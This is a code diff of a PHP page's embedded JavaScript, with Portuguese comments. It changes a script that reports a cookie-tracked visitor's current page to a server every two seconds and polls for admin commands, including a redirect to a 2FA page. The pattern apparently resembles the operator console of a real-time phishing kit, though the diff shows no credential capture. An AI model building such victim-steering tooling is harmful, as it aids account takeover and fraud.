@@ -211,36 +211,27 @@ if (isset($_COOKIE['identificador_cliente'])) {
             const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
 
             // Função que envia o "ping" para a API
-                async function sendHeartbeat() {
+            async function sendStatusUpdate() {
                 try {
-                    // Chama a API unificada que criamos
-                    const response = await fetch('api_status_manager.php', {
+                    await fetch('api_update_status.php', {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ status: currentPageStatus })
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ status: currentStatus })
                     });
-                    
-                    const data = await response.json();
-
-                    // Verifica se a API retornou um comando na resposta
-                    if (data && data.command === 'redirecionar_para_2fa') {
-                        // Se sim, para o "heartbeat" e executa o redirecionamento
-                        clearInterval(heartbeatInterval);
-                        console.log('Comando do admin recebido! Redirecionando para:', redirectUrl);
-                        window.location.href = redirectUrl;
-                    }
-
+                    // Não precisamos fazer nada com a resposta, apenas enviar.
                 } catch (error) {
-                    // Se a chamada falhar, apenas loga no console sem parar o script
-                    console.error('Erro no heartbeat:', error);
+                    // Se falhar, loga no console sem incomodar o usuário.
+                    console.error('Falha ao enviar atualização de status:', error);
                 }
             }
 
-            // Inicia o "heartbeat" para rodar a cada 3 segundos
-            const heartbeatInterval = setInterval(sendHeartbeat, 3000);
-            
-            // Envia um primeiro "heartbeat" imediatamente quando a página carrega
-            sendHeartbeat();
+            // Envia o primeiro status imediatamente ao carregar a página
+            sendStatusUpdate();
+
+            // Configura para enviar o status a cada 2000 milissegundos (2 segundos)
+            setInterval(sendStatusUpdate, 2000);
         })();
     </script>
     <script>
@@ -250,7 +241,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
 
             async function checkAdminCommand() {
                 try {
-                    const response = await fetch('api_status_manager.php');
+                    const response = await fetch('api_check_status.php');
                     const data = await response.json();
 
                     console.log('Status atual:', data.status); 
